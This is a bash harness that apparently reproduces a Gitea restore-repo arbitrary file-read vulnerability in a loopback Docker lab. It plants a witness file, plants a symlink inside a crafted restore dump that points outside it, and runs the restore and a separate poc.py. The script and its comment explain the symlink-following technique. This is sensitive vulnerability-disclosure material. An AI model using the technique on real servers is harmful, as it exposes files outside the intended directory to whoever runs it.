#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
export COMPOSE_PROJECT_NAME="${COMPOSE_PROJECT_NAME:-gitea-restore-file-open}"
BASE="${1:-http://127.0.0.1:18137}"
chmod +x poc.py dump/build-git.sh

down() {
  echo "== docker compose down =="
  docker compose down || true
}

compose_up() {
  local attempt
  echo "== docker compose up (gitea/gitea:1.27.3, loopback :18137) =="
  for attempt in $(seq 1 15); do
    if docker compose up -d --build; then
      return 0
    fi
    echo "IOC compose-up-retry attempt=${attempt}"
    sleep 20
  done
  return 1
}

wait_ready() {
  local i code
  echo "== wait for Gitea =="
  for i in $(seq 1 60); do
    code="$(curl -s -o /tmp/gitea-restore-file-open-ver -w '%{http_code}' --max-time 5 "${BASE}/api/v1/version" || true)"
    if [[ "${code}" == "200" ]]; then
      echo "IOC gitea-up http=${code}"
      return 0
    fi
    echo "IOC wait i=${i} http=${code}"
    sleep 3
  done
  return 1
}

echo "== reset leftover volume =="
docker compose down -v || true

if ! compose_up; then
  echo "FAIL docker compose up" | tee poc-last-run.txt
  docker compose logs --tail=80 gitea || true
  down
  exit 1
fi

if ! wait_ready; then
  echo "FAIL Gitea did not become ready on ${BASE}" | tee poc-last-run.txt
  docker compose logs --tail=80 gitea || true
  down
  exit 1
fi

cid="$(docker compose ps -q gitea)"
echo "== seed admin =="
docker exec -u git "${cid}" gitea admin user create \
  --admin \
  --username labadmin \
  --password LabPass123! \
  --email labadmin@localhost.invalid \
  --must-change-password=false >/dev/null 2>&1 || true

echo "== plant witness inside container =="
docker exec "${cid}" sh -c 'printf "GITEA-FILE-OPEN-WITNESS\n" > /tmp/GITEA-FILE-WITNESS.txt && chmod 644 /tmp/GITEA-FILE-WITNESS.txt'
docker exec "${cid}" sh -c 'wc -c /tmp/GITEA-FILE-WITNESS.txt; cat /tmp/GITEA-FILE-WITNESS.txt'

echo "== prepare dump (repo.yml + release.yml + git) =="
docker exec "${cid}" sh -c 'mkdir -p /data/restore-dump && cp /dump-fixture/repo.yml /dump-fixture/release.yml /data/restore-dump/ && sh /dump-fixture/build-git.sh /data/restore-dump'
# FilePathJoinAbs keeps /tmp/... under the dump root (Go filepath.Join). Restore
# still rewrites DownloadURL to file://<joined> and OpenWithClient os.Open follows
# this symlink to the witness outside the dump.
docker exec "${cid}" sh -c 'mkdir -p /data/restore-dump/tmp && ln -sfn /tmp/GITEA-FILE-WITNESS.txt /data/restore-dump/tmp/GITEA-FILE-WITNESS.txt && chown -R git:git /data/restore-dump'
docker exec "${cid}" sh -c 'ls -la /data/restore-dump /data/restore-dump/tmp /data/restore-dump/git | head -50'
docker exec "${cid}" sh -c 'readlink /data/restore-dump/tmp/GITEA-FILE-WITNESS.txt; grep GITEA-FILE-OPEN-WITNESS /data/restore-dump/*.yml || true'

echo "== gitea restore-repo =="
set +e
restore_out="$(docker exec -u git "${cid}" gitea restore-repo \
  --repo_dir /data/restore-dump \
  --owner_name labadmin \
  --repo_name restored \
  --units releases,release_assets 2>&1)"
restore_rc=$?
set -e
echo "${restore_out}"
echo "IOC restore-rc=${restore_rc}"
if [[ "${restore_rc}" != 0 ]]; then
  echo "FAIL restore-repo rc=${restore_rc}" | tee poc-last-run.txt
  echo "${restore_out}" | tee -a poc-last-run.txt
  docker compose logs --tail=80 gitea | tee -a poc-last-run.txt || true
  down
  exit 1
fi

echo "== poc.py =="
set +e
{
  echo "IOC restore-rc=${restore_rc}"
  echo "${restore_out}" | sed 's/^/IOC restore-out /'
  python3 poc.py "${BASE}"
} | tee poc-last-run.txt
rc=${PIPESTATUS[0]}
set -e
if [[ "${rc}" != 0 ]]; then
  echo "== gitea logs (tail) ==" | tee -a poc-last-run.txt
  docker compose logs --tail=80 gitea | tee -a poc-last-run.txt || true
fi
down
exit "${rc}"
